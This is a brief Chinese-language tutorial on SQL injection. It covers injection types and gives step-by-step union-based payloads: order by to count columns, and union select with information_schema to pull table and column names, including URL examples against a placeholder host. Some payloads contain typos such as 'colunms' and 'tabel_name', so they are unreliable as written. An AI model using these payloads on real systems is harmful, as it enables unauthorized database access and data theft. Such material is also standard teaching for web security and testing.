SQL注入

前提概要: SQL注入的逻辑前提<—>数据库

关于数据库

数据库是用来存放数据的仓库。

RDBMS是指关系型数据库，最典型的特征是（库–>表–>列–>行）


举一个SQL注入的列子: select * from users where username=’admin’ or 1=1# ‘ and password=’123456’;





SQL注入的类型

  • 有回显
  • 联合查询
  • 报错注入
  • 堆查询
  • 没有回显
  • 盲注（布尔型、时间型）


联合查询


举个列子--  当我们需要查询一个数据块的时候，SELECT first_name, last_name FROM users WHERE user_id = '1' or 1=1 ;
一般在输入框输入有两种可能：1、输入 1' or 1=1 #  2、输入 1' or '1'='1   这两种都可以生效，但是对应的SQL语句不同。

一般操作流程

  • 用order by查询列数
  • 用union 查询哪里有会显
用order by查询列数

输入 1' or 1=1 order by 3 （以那一列为基准来排序）#看看是否是查询失败或者成功，即可判断列数
列数可能不一定每一列都有回显


用union 查询哪里有会显

输入 1' union select 1，2 #
注意看那一列有回显，就更换哪一个数字来进行信息检索。
比如，1' union select 1,database() #

  • 获取当前数据库的表名 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
  • 获取当前数据库的列名 1' union select group_concat(column_name) from information_schema.colunms where table_schema=database() #


如果有指令被过滤智能返回一条信息，则用limitEg：select username from users limit 1,1;

3、http://xxx.com/?id='322300' order by 3 # (判断出有三行)

6、http://xxx.com/?id='0' union select group_concat(tabel_name) from information_schema.tables where table_schema=database(),2,3;
7、http://xxx.com/?id='0' union select group_concat(column_name) from information_schema.colunms where table_schema=database(),2,3 #
8、7、http://xxx.com/?id='0' union select group_concat(......) from 'table_name' #

secure_file_priv

当secure_file_priv的值为null，表示限制mysqld 不允许导入/导出。

当secure_file_priv的值为/tmp/，表示限制mysqld 在/tmp/目录下导入/导出。

当secure_file_priv的值为空，表示mysqld 没有导入/导出限制。
